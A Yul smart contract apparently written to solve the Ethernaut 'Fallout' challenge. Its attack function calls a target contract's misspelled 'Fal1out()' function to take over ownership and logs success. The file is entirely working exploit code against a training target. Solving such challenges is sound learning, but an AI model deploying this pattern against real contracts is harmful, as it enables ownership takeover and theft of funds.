object "FalloutAttack" {
  code {
    datacopy(0, dataoffset("Runtime"), datasize("Runtime"))
    return(0, datasize("Runtime"))
  }

  object "Runtime" {
    code {
      // Check if we have calldata
      if gt(calldatasize(), 0) {
        let selector := shr(224, calldataload(0))

        switch selector
        // attack(address) == 0xd018db3e
        case 0xd018db3e {
          // read attack target from calldata
          let target := calldataload(0x04)
          // `Fal1out()` =》 0x6fab5ddf
          // cast sig 'Fal1out()'
          mstore(0x00, shl(224, 0x6fab5ddf))
          // trigger the `Fal1out()`
          let res := call(gas(), target, 0, 0x00, 0x04, 0x00, 0x00)
          // store the result in memory
          mstore(0x00, res)
          if eq(res, 1) {
            // `success` => 0x53756363657373
            log1(0x00, 0x20, 0x53756363657373)
            // Return true
            mstore(0x00, 0x01)
            return(0x00, 0x20)
          }

          // Return false when the external call fails
          mstore(0x00, 0x00)
          return(0x00, 0x20)
        }

        default {
          revert(0, 0)
        }
      }

      // receive/fallback path
      stop()
    }
  }
}